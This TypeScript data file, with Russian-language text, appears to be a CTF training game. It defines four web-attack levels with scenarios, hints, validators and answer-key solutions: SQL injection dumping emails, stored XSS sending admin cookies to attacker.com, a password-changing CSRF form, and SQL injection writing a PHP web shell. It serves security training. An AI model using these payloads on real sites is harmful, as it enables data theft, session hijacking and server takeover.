// CTF Simulation Data

export interface CTFLevel {
  id: string;
  title: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard' | 'expert';
  points: number;
  timeLimit: number;
  vulnerabilities: string[];
  scenario: string;
  hints: string[];
  solution: string;
  validation: (input: string) => boolean;
}

export const ctfLevels: CTFLevel[] = [
  {
    id: 'ctf-1',
    title: 'Взлом интернет-магазина',
    description: 'Найдите уязвимость в поиске товаров и извлеките скрытые данные',
    difficulty: 'easy',
    points: 100,
    timeLimit: 300,
    vulnerabilities: ['SQL Injection', 'Information Disclosure'],
    scenario: 'Вы исследуете интернет-магазин электроники. В форме поиска товаров есть уязвимость, позволяющая извлечь данные о пользователях. Найдите способ получить список всех email-адресов зарегистрированных пользователей.',
    hints: [
      'Попробуйте использовать UNION SELECT',
      'Вам нужно определить количество столбцов в исходном запросе',
      'Используйте ORDER BY для определения структуры',
    ],
    solution: "' UNION SELECT NULL, email, NULL FROM users--",
    validation: (input) => {
      const lower = input.toLowerCase();
      return lower.includes('union') && 
             lower.includes('select') && 
             lower.includes('email') && 
             lower.includes('users') &&
             lower.includes('--');
    },
  },
  {
    id: 'ctf-2',
    title: 'XSS в форме обратной связи',
    description: 'Внедрите XSS payload в форму обратной связи',
    difficulty: 'medium',
    points: 200,
    timeLimit: 420,
    vulnerabilities: ['Cross-Site Scripting (XSS)', 'Stored XSS'],
    scenario: 'На сайте есть форма обратной связи, где сообщения сохраняются и отображаются в админ-панели. Администратор регулярно проверяет сообщения. Внедрите payload, который украдёт cookie администратора при просмотре сообщения.',
    hints: [
      'Используйте тег <script> для выполнения JavaScript',
      'Cookie можно получить через document.cookie',
      'Нужно отправить cookie на ваш сервер',
    ],
    solution: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
    validation: (input) => {
      const lower = input.toLowerCase();
      return (lower.includes('<script>') || lower.includes('javascript:')) &&
             (lower.includes('document.cookie') || lower.includes('cookie')) &&
             (lower.includes('fetch') || lower.includes('xmlhttprequest') || lower.includes('location.href'));
    },
  },
  {
    id: 'ctf-3',
    title: 'CSRF атака на смену пароля',
    description: 'Создайте CSRF атаку для изменения пароля другого пользователя',
    difficulty: 'hard',
    points: 300,
    timeLimit: 600,
    vulnerabilities: ['Cross-Site Request Forgery (CSRF)', 'Missing CSRF Tokens'],
    scenario: 'На сайте есть форма смены пароля, которая не защищена CSRF токенами. Создайте HTML страницу, которая при открытии жертвой изменит её пароль на указанный вами.',
    hints: [
      'Используйте форму с method="POST"',
      'Скрытые поля для передачи данных',
      'Автоматическая отправка формы через JavaScript',
    ],
    solution: `<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit()</script>`,
    validation: (input) => {
      const lower = input.toLowerCase();
      return lower.includes('<form') &&
             lower.includes('method="post"') &&
             (lower.includes('submit()') || lower.includes('onsubmit')) &&
             lower.includes('password');
    },
  },
  {
    id: 'ctf-4',
    title: 'Цепочка атак: SQLi → RCE',
    description: 'Используйте SQL инъекцию для получения удалённого выполнения кода',
    difficulty: 'expert',
    points: 500,
    timeLimit: 900,
    vulnerabilities: ['SQL Injection', 'Remote Code Execution', 'File Upload'],
    scenario: 'На сайте есть уязвимость SQL инъекции в параметре id. Используйте её для записи PHP шелла на сервер и получите выполнение произвольных команд.',
    hints: [
      'Используйте INTO OUTFILE для записи файла',
      'Нужно знать путь к веб-директории',
      'PHP шелл должен принимать команды через GET параметры',
    ],
    solution: "1 UNION SELECT '<?php system($_GET[cmd]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--",
    validation: (input) => {
      const lower = input.toLowerCase();
      return lower.includes('union') &&
             lower.includes('select') &&
             lower.includes('into outfile') &&
             lower.includes('.php') &&
             (lower.includes('system(') || lower.includes('exec(') || lower.includes('shell_exec('));
    },
  },
];

export interface Team {
  id: string;
  name: string;
  score: number;
  completedLevels: string[];
  timeSpent: number;
}

export const initialTeams: Team[] = [
  { id: 'team-1', name: 'Красная команда', score: 850, completedLevels: ['ctf-1', 'ctf-2', 'ctf-3'], timeSpent: 1200 },
  { id: 'team-2', name: 'Синяя команда', score: 600, completedLevels: ['ctf-1', 'ctf-2'], timeSpent: 900 },
  { id: 'team-3', name: 'Зелёная команда', score: 300, completedLevels: ['ctf-1'], timeSpent: 400 },
  { id: 'team-4', name: 'Ваша команда', score: 0, completedLevels: [], timeSpent: 0 },
];